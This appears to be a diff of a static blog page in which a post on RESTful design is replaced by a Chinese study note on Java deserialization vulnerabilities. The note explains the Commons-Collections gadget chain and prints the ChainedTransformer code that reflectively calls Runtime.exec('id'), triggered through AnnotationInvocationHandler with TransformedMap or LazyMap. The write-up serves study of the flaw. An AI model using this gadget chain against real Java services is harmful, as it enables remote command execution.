@@ -80,7 +80,7 @@
 <link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Misc," />
+  <meta name="keywords" content="Java," />
 
 
 
@@ -98,22 +98,28 @@
 
 
 
-<meta name="description" content="REST(REpresentational State Transfer)，可以试译为”表现状态转变”。 REST是一种软件架构风格，也是一套约束条件。满足这套约束条件的设计叫做RESTful设计，在此之上的实现叫做RESTful的实现。
-表现状态转变(REST)缺少个主体，即“资源”。所以可以被叫做“资源表现状态转变”。
-一、资源(Resources)资源，即网络上的一个实体。它可能是一段文本，">
+<meta name="description" content="前言对于JAVA反序列化漏洞原理，《java反序列化漏洞原理分析》和《Lib之过？Java反序列化漏洞通用利用分析》两篇文章已经分析的很是透彻了。本篇小记是为了简要记录一下漏洞原理，以防忘记时可以快速查找。
+要点
+待序列化类必须实现 Serializable 接口。 
+反序列化过程会自动调用类的readObject(java.io.ObjectInputStream in)方法。 
+反序列化命令执">
 <meta property="og:type" content="article">
-<meta property="og:title" content="对RESTful的理解">
-<meta property="og:url" content="http://retanoj.github.io/2016/07/21/Misc-2016-07-21-对RESTful的理解/index.html">
+<meta property="og:title" content="Java反序列化漏洞原理小记">
+<meta property="og:url" content="http://retanoj.github.io/2016/11/26/Java-2016-11-26-JAVA反序列化漏洞原理小记/index.html">
 <meta property="og:site_name" content="retanoj's Blog">
-<meta property="og:description" content="REST(REpresentational State Transfer)，可以试译为”表现状态转变”。 REST是一种软件架构风格，也是一套约束条件。满足这套约束条件的设计叫做RESTful设计，在此之上的实现叫做RESTful的实现。
-表现状态转变(REST)缺少个主体，即“资源”。所以可以被叫做“资源表现状态转变”。
-一、资源(Resources)资源，即网络上的一个实体。它可能是一段文本，">
-<meta property="og:updated_time" content="2016-10-31T07:05:00.000Z">
+<meta property="og:description" content="前言对于JAVA反序列化漏洞原理，《java反序列化漏洞原理分析》和《Lib之过？Java反序列化漏洞通用利用分析》两篇文章已经分析的很是透彻了。本篇小记是为了简要记录一下漏洞原理，以防忘记时可以快速查找。
+要点
+待序列化类必须实现 Serializable 接口。 
+反序列化过程会自动调用类的readObject(java.io.ObjectInputStream in)方法。 
+反序列化命令执">
+<meta property="og:updated_time" content="2016-11-26T12:08:01.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="对RESTful的理解">
-<meta name="twitter:description" content="REST(REpresentational State Transfer)，可以试译为”表现状态转变”。 REST是一种软件架构风格，也是一套约束条件。满足这套约束条件的设计叫做RESTful设计，在此之上的实现叫做RESTful的实现。
-表现状态转变(REST)缺少个主体，即“资源”。所以可以被叫做“资源表现状态转变”。
-一、资源(Resources)资源，即网络上的一个实体。它可能是一段文本，">
+<meta name="twitter:title" content="Java反序列化漏洞原理小记">
+<meta name="twitter:description" content="前言对于JAVA反序列化漏洞原理，《java反序列化漏洞原理分析》和《Lib之过？Java反序列化漏洞通用利用分析》两篇文章已经分析的很是透彻了。本篇小记是为了简要记录一下漏洞原理，以防忘记时可以快速查找。
+要点
+待序列化类必须实现 Serializable 接口。 
+反序列化过程会自动调用类的readObject(java.io.ObjectInputStream in)方法。 
+反序列化命令执">
 
 
 
@@ -134,10 +140,10 @@
 
 
 
-  <link rel="canonical" href="http://retanoj.github.io/2016/07/21/Misc-2016-07-21-对RESTful的理解/"/>
+  <link rel="canonical" href="http://retanoj.github.io/2016/11/26/Java-2016-11-26-JAVA反序列化漏洞原理小记/"/>
 
 
-  <title> 对RESTful的理解 | retanoj's Blog </title>
+  <title> Java反序列化漏洞原理小记 | retanoj's Blog </title>
 <style>
 #header {
   background-image: url(/images/banner.jpg);
@@ -273,7 +279,7 @@
             
             
               
-                对RESTful的理解
+                Java反序列化漏洞原理小记
               
             
           </h1>
@@ -285,8 +291,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-21T00:00:00+08:00" content="2016-07-21">
-              2016-07-21
+            <time itemprop="dateCreated" datetime="2016-11-26T00:00:00+08:00" content="2016-11-26">
+              2016-11-26
             </time>
           </span>
 
@@ -299,8 +305,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Misc/" itemprop="url" rel="index">
-                    <span itemprop="name">Misc</span>
+                  <a href="/categories/Java/" itemprop="url" rel="index">
+                    <span itemprop="name">Java</span>
                   </a>
                 </span>
 
@@ -315,8 +321,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/07/21/Misc-2016-07-21-对RESTful的理解/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/21/Misc-2016-07-21-对RESTful的理解/" itemprop="commentsCount"></span>
+                <a href="/2016/11/26/Java-2016-11-26-JAVA反序列化漏洞原理小记/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/11/26/Java-2016-11-26-JAVA反序列化漏洞原理小记/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -339,22 +345,51 @@
       
 
       
-        <p>REST(REpresentational State Transfer)，可以试译为”表现状态转变”。 REST是一种软件架构风格，也是一套约束条件。满足这套约束条件的设计叫做RESTful设计，在此之上的实现叫做RESTful的实现。</p>
-<p>表现状态转变(REST)缺少个主体，即“资源”。所以可以被叫做“资源表现状态转变”。</p>
-<h2 id="一、资源-Resources"><a href="#一、资源-Resources" class="headerlink" title="一、资源(Resources)"></a>一、资源(Resources)</h2><p>资源，即网络上的一个实体。它可能是一段文本，一张图片，也可能是一个服务。通常用URI（统一资源定位符）指向它。</p>
-<h2 id="二、表现-Representation"><a href="#二、表现-Representation" class="headerlink" title="二、表现(Representation)"></a>二、表现(Representation)</h2><p>表现，即资源这个信息实体的表现形式。例如文本可以以HTML的形式来展现给用户，还可以已JSON展现。</p>
-<p>因此，有些言论中说，URI中定位到资源时的后缀带有“.html”是不必要的，因为它在“资源”的层面表达了“表现”层面所要表达的内容。这样的说法也不无道理。而资源的具体表现形式，应该在HTTP协议中的Content-Type字段和Accept字段中被描述。</p>
-<h2 id="三、状态转变-State-Transfer"><a href="#三、状态转变-State-Transfer" class="headerlink" title="三、状态转变(State Transfer)"></a>三、状态转变(State Transfer)</h2><p>HTTP协议是一个无状态的协议。客户端和服务器交互的状态被通过各种方式保存在服务端。例如用户上传了自己的头像，更新了自己的昵称，这些都在服务端被记录和保存。由此看来，如果用户想让处在服务端的资源发生改变，就要通过某种手段让其状态发生转变。而这种转变是建立在“表现”层上，所以被叫做“表现状态转变”。</p>
-<p>在REST里规定了客户端操纵资源的几个动词，即HTTP协议中的Method。包括“GET”(获取)、“POST”(新建)、“PUT”(更新)、“DELETE”(删除)。</p>
-<h2 id="四、案例-Case-Study"><a href="#四、案例-Case-Study" class="headerlink" title="四、案例(Case Study)"></a>四、案例(Case Study)</h2><p>1) /posts/33  vs  /posts/show/33</p>
-<p>URI里包含动词是RESTful设计的一大误区。动词应该是HTTP的Method，不应该出现在URI中。URI是单纯的对互联网上资源的指向。因此GET /posts/33是正确的设计方法。</p>
-<p>2) /account/2/transfer/104/to/5  vs  /transaction</p>
-<p>RESTful的动词的确存在局限，例如在金钱交易的时候，四个动词均不能表达“转账”的概念。但换个角度来看，“转账”可以成为一项服务，而服务可以被看做互联网上的一种资源（服务是资源）。因此可以在URI中将“转账”设计成/transaction，通过动词POST来建立转账记录。</p>
-<pre><code>POST /transaction HTTP/2.0
-...
-
-account=2&amp;money=104.00&amp;to=5
-</code></pre><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://www.ruanyifeng.com/blog/2011/09/restful.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2011/09/restful.html</a></p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于JAVA反序列化漏洞原理，<a href="http://www.angelwhu.com/blog/?p=394" title="java反序列化漏洞原理分析" target="_blank" rel="external">《java反序列化漏洞原理分析》</a>和<a href="https://blog.chaitin.com/2015-11-11_java_unserialize_rce/#h4.3_jenkins" title="Lib之过？Java反序列化漏洞通用利用分析" target="_blank" rel="external">《Lib之过？Java反序列化漏洞通用利用分析》</a>两篇文章已经分析的很是透彻了。<br>本篇小记是为了简要记录一下漏洞原理，以防忘记时可以快速查找。</p>
+<h2 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h2><ol>
+<li>待序列化类必须实现 Serializable 接口。 </li>
+<li>反序列化过程会自动调用类的readObject(java.io.ObjectInputStream in)方法。 </li>
+<li>反序列化命令执行的核心是ChainedTransformer，助手是被装饰的Map，自动触发是AnnotationInvocationHandler。</li>
+</ol>
+<h2 id="Payload外衣-—-TransformedMap"><a href="#Payload外衣-—-TransformedMap" class="headerlink" title="Payload外衣 — TransformedMap"></a>Payload外衣 — TransformedMap</h2><p>TransformedMap可被序列化，可以将任意Map对象生成相应的TransformedMap对象。<br>当一个TransformedMap对象的迭代对象被调用setValue()时，会触发</p>
+<pre><code>Map.Entry.setValue() ==&gt; 
+AbstractInputCheckedMapDecorator.MapEntry.setValue() ==&gt; 
+TransformedMap.checkSetValue() ==&gt; 
+valueTransformer.transform() 
+</code></pre><p>如果valueTransformer为一个构造好的ChainedTransformer，即可执行exec()。</p>
+<p>即：<em>一个 TransformedMap 在 setValue() 时可以 exec() 。</em></p>
+<h2 id="Payload外衣-—-LazyMap"><a href="#Payload外衣-—-LazyMap" class="headerlink" title="Payload外衣 — LazyMap"></a>Payload外衣 — LazyMap</h2><p>LazyMap可被序列化，也可以给Map对象添加Transformer生成相应的LazyMap。<br>当LazyMap对象成员被调用get()时，会触发 </p>
+<pre><code>this.factory.transform(key)
+</code></pre><p>如果factory为一个构造好的ChainedTransformer，即可执行exec()。</p>
+<p>即：<em>一个 LazyMap 在 get() 时可以 exec() 。</em></p>
+<h2 id="Payload核心-—-ChainedTransformer"><a href="#Payload核心-—-ChainedTransformer" class="headerlink" title="Payload核心 — ChainedTransformer"></a>Payload核心 — ChainedTransformer</h2><p>这里Payload以命令执行为目标。<br>ChainedTransformer可以将一系列Transformer串联组装起来，而在ConstantTransformer和InvokerTransformer的帮助下，恰好可以完成</p>
+<pre><code>Runtime.getRuntime().exec(&quot;id&quot;);
+</code></pre><p>但是Runtime类未实现Serializable接口，需要利用反射的方法来完成调用，即：</p>
+<pre><code>((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;).invoke(null, new Object[0])).exec(&quot;id&quot;)
+</code></pre><p>因此，ChainedTransformer构造如下：</p>
+<pre><code>Transformer[] transformers = new Transformer[] {
+   new ConstantTransformer(Runtime.class),
+   new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
+       String.class, Class[].class }, new Object[] {
+           getRuntime&quot;, new Class[0] }),
+   new InvokerTransformer(&quot;invoke&quot;, new Class[] {
+       Object.class, Object[].class }, new Object[] {
+           null, new Object[0] }),
+    new InvokerTransformer(&quot;exec&quot;, new Class[] {
+       String[].class }, new Object[] { &quot;id&quot; }),
+    new ConstantTransformer(1) };
+Transformer transformerChain = new ChainedTransformer(transformers);
+</code></pre><h2 id="Payload触发器-—-AnnotationInvocationHandler"><a href="#Payload触发器-—-AnnotationInvocationHandler" class="headerlink" title="Payload触发器 — AnnotationInvocationHandler"></a>Payload触发器 — AnnotationInvocationHandler</h2><p>以上所述要达到命令执行，需要对Map进行setValue()或get()操作。而我们需要让一个对象在被反序列化时，自动触发对Map的操作，从而执行命令。<br>AnnotationInvocationHandler类可被序列化，且拥有Map成员。该类的对象在被反序列化时，可以满足条件。</p>
+<h3 id="装载TransformedMap"><a href="#装载TransformedMap" class="headerlink" title="装载TransformedMap"></a>装载TransformedMap</h3><p>在java 1.7中，AnnotationInvocationHandler类的readObject()方法存在对其Map成员的setValue()调用。当Map成员为一个构造好的TransformedMap，AnnotationInvocationHandler对象在被反序列化时，即可执行exec()。</p>
+<p>即：<em>一个被构造了 TransformedMap 成员的 AnnotationInvocationHandler 在反序列化时可以 exec() 。</em></p>
+<h3 id="装载LazyMap"><a href="#装载LazyMap" class="headerlink" title="装载LazyMap"></a>装载LazyMap</h3><p>AnnotationInvocationHandler类实现了InvocationHandler接口，可以代理其他对象。<br>被AnnotationInvocationHandler代理的对象进行方法调用时，会执行AnnotationInvocationHandler类的invoke()方法。<br>在AnnotationInvocationHandler类的invoke()方法中，存在对其Map成员的get()调用，因此在其代理的对象进行方法调用时，有可能执行exec()。<br>假设Map对象AAAMap被一个拥有LazyMap成员的AnnotationInvocationHandler类代理了，则AAAMap对象进行方法调用时（如AAAMap.get()）就会exec()。为了反序列化时就exec()，还需要将AAAMap装填在一个新的AnnotationInvocationHandler中，最终达到如下调用链： </p>
+<pre><code>AIHandler1.readObject() ==&gt;
+AIHandler1.memberValues.xxx() ==&gt; // memberValues为被代理的AAAMap
+AIHandler2.invoke() ==&gt;
+AIHandler2.memberValues.get() ==&gt; // memberValues为构造的LazyMap
+ChainedTransformer.transform() ==&gt;
+exec()
+</code></pre><p>即：<em>一个被构造了 LazyMap 成员的 AnnotationInvocationHandler 类代理的对象，在进行方法调用时可能执行 exec() 。</em></p>
 
       
     </div>
@@ -377,7 +412,7 @@ account=2&amp;money=104.00&amp;to=5
       
         <div class="post-tags">
           
-            <a href="/tags/Misc/" rel="tag">#Misc</a>
+            <a href="/tags/Java/" rel="tag">#Java</a>
           
         </div>
       
@@ -386,17 +421,13 @@ account=2&amp;money=104.00&amp;to=5
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/04/16/题目-2016-04-16-leetcode-338-Counting-Bits/" rel="next" title="leetcode 338.Counting Bits">
-                <i class="fa fa-chevron-left"></i> leetcode 338.Counting Bits
+              <a href="/2016/10/31/Misc-2016-10-31-从Jekyll迁移到Hexo/" rel="next" title="从Jekyll迁移到Hexo">
+                <i class="fa fa-chevron-left"></i> 从Jekyll迁移到Hexo
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/07/26/Misc-2016-07-26-解决MAC双屏时同时滑动/" rel="prev" title="解决MAC双屏时同时滑动">
-                解决MAC双屏时同时滑动 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -411,10 +442,10 @@ account=2&amp;money=104.00&amp;to=5
 
     <div class="post-spread">
       
-        <div class="ds-share flat" data-thread-key="2016/07/21/Misc-2016-07-21-对RESTful的理解/"
-     data-title="对RESTful的理解"
+        <div class="ds-share flat" data-thread-key="2016/11/26/Java-2016-11-26-JAVA反序列化漏洞原理小记/"
+     data-title="Java反序列化漏洞原理小记"
      data-content=""
-     data-url="http://retanoj.github.io/2016/07/21/Misc-2016-07-21-对RESTful的理解/">
+     data-url="http://retanoj.github.io/2016/11/26/Java-2016-11-26-JAVA反序列化漏洞原理小记/">
   <div class="ds-share-inline">
     <ul  class="ds-share-icons-16">
 
@@ -444,8 +475,8 @@ account=2&amp;money=104.00&amp;to=5
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/07/21/Misc-2016-07-21-对RESTful的理解/"
-           data-title="对RESTful的理解" data-url="http://retanoj.github.io/2016/07/21/Misc-2016-07-21-对RESTful的理解/">
+      <div class="ds-thread" data-thread-key="2016/11/26/Java-2016-11-26-JAVA反序列化漏洞原理小记/"
+           data-title="Java反序列化漏洞原理小记" data-url="http://retanoj.github.io/2016/11/26/Java-2016-11-26-JAVA反序列化漏洞原理小记/">
       </div>
     
   </div>
@@ -572,7 +603,7 @@ account=2&amp;money=104.00&amp;to=5
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、资源-Resources"><span class="nav-number">1.</span> <span class="nav-text">一、资源(Resources)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、表现-Representation"><span class="nav-number">2.</span> <span class="nav-text">二、表现(Representation)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、状态转变-State-Transfer"><span class="nav-number">3.</span> <span class="nav-text">三、状态转变(State Transfer)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、案例-Case-Study"><span class="nav-number">4.</span> <span class="nav-text">四、案例(Case Study)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#参考资料"><span class="nav-number">4.1.</span> <span class="nav-text">参考资料</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#要点"><span class="nav-number">2.</span> <span class="nav-text">要点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload外衣-—-TransformedMap"><span class="nav-number">3.</span> <span class="nav-text">Payload外衣 — TransformedMap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload外衣-—-LazyMap"><span class="nav-number">4.</span> <span class="nav-text">Payload外衣 — LazyMap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload核心-—-ChainedTransformer"><span class="nav-number">5.</span> <span class="nav-text">Payload核心 — ChainedTransformer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload触发器-—-AnnotationInvocationHandler"><span class="nav-number">6.</span> <span class="nav-text">Payload触发器 — AnnotationInvocationHandler</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#装载TransformedMap"><span class="nav-number">6.1.</span> <span class="nav-text">装载TransformedMap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#装载LazyMap"><span class="nav-number">6.2.</span> <span class="nav-text">装载LazyMap</span></a></li></ol></li></ol></div>
             
           </div>
         </section>
